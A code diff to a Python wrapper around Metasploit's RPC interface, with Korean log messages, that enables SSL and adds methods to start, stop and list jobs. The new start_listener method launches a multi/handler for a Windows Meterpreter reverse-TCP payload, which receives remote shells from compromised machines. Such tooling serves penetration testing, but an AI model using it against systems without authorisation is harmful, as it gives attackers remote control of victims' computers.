@@ -20,7 +20,7 @@ class MsfClient:
     def connect(self):
         try:
             from pymetasploit3.msfrpc import MsfRpcClient
-            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=False)
+            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=True)
             self._connected = True
             logger.info("MSF-RPC 연결 성공")
             return True
@@ -32,7 +32,7 @@ class MsfClient:
     def reconnect(self):
         try:
             from pymetasploit3.msfrpc import MsfRpcClient
-            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=False)
+            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=True)
             self._connected = True
         except Exception as e:
             logger.error(f"재인증 실패: {e}")
@@ -82,6 +82,42 @@ class MsfClient:
         except Exception as e:
             logger.error(f"Kill all 실패: {e}")
             return False
+
+    def start_listener(self, lhost, lport):
+        if not self._connected:
+            return None, "MSF-RPC 연결 없음"
+        try:
+            exploit = self.client.modules.use('exploit', 'multi/handler')
+            exploit['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
+            exploit['LHOST'] = lhost
+            exploit['LPORT'] = int(lport)
+            exploit['ExitOnSession'] = False
+            result = exploit.execute(payload='windows/meterpreter/reverse_tcp')
+            job_id = result.get('job_id')
+            if job_id is None:
+                return None, f"핸들러 실행 실패: {result}"
+            return job_id, None
+        except Exception as e:
+            logger.error(f"리스너 시작 실패: {e}")
+            return None, str(e)
+
+    def stop_listener(self, job_id):
+        if not self._connected:
+            return False, "MSF-RPC 연결 없음"
+        try:
+            self.client.jobs.stop(str(job_id))
+            return True, None
+        except Exception as e:
+            logger.error(f"리스너 중지 실패: {e}")
+            return False, str(e)
+
+    def get_jobs(self):
+        if not self._connected:
+            return {}
+        try:
+            return self.client.jobs.list
+        except Exception:
+            return {}
 
     def is_connected(self):
         return self._connected
